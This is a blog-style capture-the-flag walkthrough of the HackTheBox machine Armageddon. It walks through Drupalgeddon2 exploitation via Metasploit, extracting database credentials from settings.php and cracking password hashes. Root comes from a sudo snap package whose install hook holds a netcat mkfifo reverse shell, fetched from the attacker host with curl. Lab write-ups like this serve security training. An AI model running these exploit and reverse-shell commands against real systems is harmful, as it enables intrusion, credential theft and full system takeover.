---
layout: post
title: "Armageddon"
date: 2022-03-06
categories: [HackTheBox, Easy-HTB]
tags: [Metasploit, Drupal, hash-cracking , fpm, snap, CMS Exploit, Password Reuse, CVE, Weak Password]
image: ../../assets/img/posts/Armageddon.png

---

|**Machine**|[Armageddon](https://app.hackthebox.com/machines/323)|
|:---:|:---:|
|**OS**|Linux|
|**Difficulty**|Easy|
|**Creator**|[bertolis](https://app.hackthebox.com/users/27897)|

---

We'll start with connecting to HTB network by making connection with .ovpn file and then spin up machine

This box's IP is **10.10.10.233**.

Let's start with nmap scan,

```bash
sudo nmap -A -T4 -p- 10.10.10.233 -oN nmap_scan
```

![image](https://user-images.githubusercontent.com/67465230/156897876-eb19ab18-da41-4fe2-ac34-8dd430fb00cc.png)

there are ports open, i.e. 22 (SSH), 80 (HTTP) and there are many things which we can check on port 80.

Let's view what technologies are running on website,

```bash
whatweb http://10.10.10.233
```

![image](https://user-images.githubusercontent.com/67465230/156897957-62eebef3-d877-46a8-a0fc-87c1c87ad6b7.png)

This website is running a software named **Drupal v7**. 

Let's visit http://10.10.10.233,

![image](https://user-images.githubusercontent.com/67465230/156897974-ed406154-4771-4f4d-b7b2-98e698156662.png)

seems like we got a login page. 

Let's brute force directories using dirsearch,

```bash
python3 /home/kali/tools/dirsearch/dirsearch.py -e txt,php -i 200,301
```

![image](https://user-images.githubusercontent.com/67465230/156897985-31d5b92a-bc5c-4829-81fa-99e78fd61eab.png)

there are many files and directories. Let's check **/robots.txt** file,

we got many files after visiting **/robots.txt** path and there's a path which seems interesting to me,

![image](https://user-images.githubusercontent.com/67465230/156897992-c5bae27e-9983-4084-9b78-1a1b64722511.png)

**/CHANGELOG.txt** path stands out. Let's check it,

this **/CHANGELOG.txt** file reveals the Drupal Software current running version which is 7.56,

![image](https://user-images.githubusercontent.com/67465230/156898002-bfee473e-4edb-4ef3-b2ea-f1cc6b54cfe7.png)

Let's now search for this Drupal v7.56 exploit,

```bash
searchsploit drupal 7.56
```

![image](https://user-images.githubusercontent.com/67465230/156898017-21b2129b-74df-4bfe-90fa-4cf98be0e460.png)

**Drupal < 8.3.9 / < 8.4.6 / < 8.5.1 - 'Drupalgeddon2' RCE (Metasploit)**

We got Drupalgeddon metasploit module, we'll use this. Let's fire up metasploit-framework using `msfconsole -q` and search for **drupalgeddon**,

```bash
search Drupalgeddon
```

![image](https://user-images.githubusercontent.com/67465230/156898025-3f1fa59f-b04c-4d08-97c5-d427af6287ba.png)

we got this module. Let's use this to exploit this box.

```bash
use exploit/unix/webapp/drupal_drupalgeddon2
```

![image](https://user-images.githubusercontent.com/67465230/156898033-eca7124e-f282-4c43-bef4-baa08a208d0a.png)

then we'll set options:
- **set rhosts 10.10.10.233**
- **set lhost tun0**
- **set lport 4444**

Then run this exploit using `run` command,

![image](https://user-images.githubusercontent.com/67465230/156898038-943d10b5-af34-40f8-b13c-ccc1266a2f2a.png)

we'll get **meterpreter session** and we can confim this using **sysinfo** command.

Let's have a shell now and we'll get a shell with `shell` command,

![image](https://user-images.githubusercontent.com/67465230/156898047-10b7e959-06fe-402f-a090-39202facfc77.png)

and we'll improve shell's functionality with `/bin/bash -i` command.

after enumeration, I found a file in **/var/www/html/sites/default/** that contains username and password hash of the user. 

```bash
pwd
ls -la
```

![image](https://user-images.githubusercontent.com/67465230/156898055-278bc92d-383d-4de5-b5b3-c8e61e98ccc7.png)

Let's check it.

```bash
cat settings.php
```

![image](https://user-images.githubusercontent.com/67465230/156898095-84051b89-1dea-470e-bc3a-70dd6609ea26.png)

after scrolling down a bit, I found mysql credentials.

Let's now query with DB to let us have credentials with this command,

```bash
mysql -u drupaluser -p<pass_hash> -e "use drupal;select * from users\G;"
```

![image](https://user-images.githubusercontent.com/67465230/156898110-c824da96-093c-47f2-a9e8-a22682425b09.png)

it'll give us username and password hash of the user. Let's now crack it with **JohnTheRipper** cracking tool.

Let's first create a file named **hash** with `touch` command and copy the password to hash file. 

We can crack this hash using JTR,

```bash
john hash --wordlist=/usr/share/wordlists/rockyou.txt
```

![image](https://user-images.githubusercontent.com/67465230/156898121-a5a4fa65-4081-4900-9de9-937381b43da9.png)

We got cracked password of the user.

Let's connect to ssh,

```bash
ssh brutetherealadmin@10.10.10.233
```

![image](https://user-images.githubusercontent.com/67465230/156898126-8cbf4fb6-23b8-48d0-afa8-6a12a892db55.png)

And we also got ssh access of the user. 

Establishing directory content,

![image](https://user-images.githubusercontent.com/67465230/156898132-101ea0cf-70a7-42c2-b997-9906375e2327.png)

AHA! User flag. 

It's time for **Privilege Escalation**. Let's check if we can run binaries with `sudo` command without providing password,

```bash
sudo -l
```

![image](https://user-images.githubusercontent.com/67465230/156898165-a32dc801-be3c-41ae-aaad-aaa5780a2624.png)

we can run **/usr/bin/snap** binary as **sudo**. Let's first get to know about snap,

>Snap is a software packaging and deployment system developed by Canonical for operating systems that use the Linux kernel.

let's us first know what version of snap is running on box,

```bash
snap --version
```

![image](https://user-images.githubusercontent.com/67465230/156898179-d3866753-f254-498a-a187-95f8c542898f.png)

Let's search this snap binary on how we can exploit it to get system access on **GTFObins**.

![image](https://user-images.githubusercontent.com/67465230/156898191-9967689c-24db-4b78-8802-15af0a2cd0ab.png)

This seems like we've to follow along these commands on our own machine and then transfer the final package to box in order too get root.

We've to make this package using **fpm** tool, so make sure to read this documentation https://fpm.readthedocs.io/en/latest/ on fpm about what it is, how it works, installation etc.

Let's first navigate to **/tmp** directory on our own machine and type these commands,

```bash
COMMAND="rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.14.24 4444 >/tmp/f"
cd $(mktemp -d)
mkdir -p meta/hooks
printf '#!/bin/sh\n%s; false' "$COMMAND" >meta/hooks/install
chmod +x meta/hooks/install
fpm -n xxxx -s dir -t snap -a all meta
```

![image](https://user-images.githubusercontent.com/67465230/156898197-c449a26a-4245-4a0c-a081-4fa5291ff45d.png)

after running all of these commands, our package is now ready to get transferred.

**NOTE: When declaring COMMAND var, we'll put a netcat reverse shell there to get us a reverse connection on new terminal window.**

Let's start python server using `python3 -m http.server` command and transfer this **xxxx_1.0_all.snap** package on machine,

first let's navigate to **/tmp** directory on remote box and then download the package on the machine,

```bash
curl http://10.10.14.24:8000/xxxx_1.0_all.snap > xxxx_1.0_all.snap
```

Now, let's start a netcat listener on new terminal window using `nc -nvlp 4444` and run this package on remote box using this command,

```bash
sudo snap install xxxx_1.0_all.snap --dangerous --devmode
```

![image](https://user-images.githubusercontent.com/67465230/156898232-f2cf8f7b-310b-4c59-87df-92a7950af363.png)

when this command gets executed then we'll get a reverse connection on our netcat listener,

![image](https://user-images.githubusercontent.com/67465230/156898241-6070975d-984d-4b72-91b5-5a7d3a1c4d26.png)

we've now system access!! Let's confirm it with `id` command. We have rooted this box. 